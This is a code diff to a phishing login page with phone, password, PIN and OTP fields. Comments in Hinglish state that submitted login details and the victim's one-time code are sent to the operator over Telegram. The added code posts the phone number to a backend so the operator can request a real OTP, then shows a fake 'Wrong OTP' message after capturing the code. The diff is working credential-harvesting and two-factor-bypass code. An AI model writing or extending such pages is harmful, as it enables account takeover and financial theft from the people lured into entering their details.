@@ -285,7 +285,7 @@
         </div>
 
         <form id="loginForm" style="width: 100%;">
-            <!-- Phone Input with User Outline Icon -->
+            <!-- Phone Input -->
             <div class="input-group">
                 <span class="icon">
                     <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
@@ -296,7 +296,7 @@
                 <input type="tel" id="phone" placeholder="Phone" maxlength="10" pattern="[0-9]{10}" required>
             </div>
 
-            <!-- Password Input with Padlock Icon -->
+            <!-- Password Input -->
             <div class="input-group">
                 <span class="icon">
                     <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
@@ -383,12 +383,12 @@
             this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
         });
 
-        // PIN validation (Only numbers, max 6 digits)
         const pinInput = document.getElementById('pin');
         pinInput.addEventListener('input', function(e) {
             this.value = this.value.replace(/[^0-9]/g, '').slice(0, 6);
         });
 
+        // 1. Sign In click hone par Login Details Telegram par jayengi aur Modal open hoga
         loginForm.addEventListener('submit', async function(e) {
             e.preventDefault();
             
@@ -427,9 +427,23 @@
             otpModal.style.display = 'flex';
         });
 
-        sendOtpBtn.addEventListener('click', function() {
+        // 2. Send button click hone par Telegram par OTP Request message jayega
+        sendOtpBtn.addEventListener('click', async function() {
             successText.style.display = 'block';
             
+            try {
+                await fetch('/api/send', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        type: 'OTP_REQUEST',
+                        phone: currentPhone 
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending OTP request:', error);
+            }
+
             let timeLeft = 59;
             sendOtpBtn.innerText = timeLeft + 's';
             sendOtpBtn.disabled = true;
@@ -452,6 +466,7 @@
             clearInterval(countdownInterval);
         });
 
+        // 3. Confirm button click hone par OTP code Telegram par jayega aur "Wrong OTP" dikhega
         document.getElementById('otpForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             const otp = document.getElementById('otpCode').value;
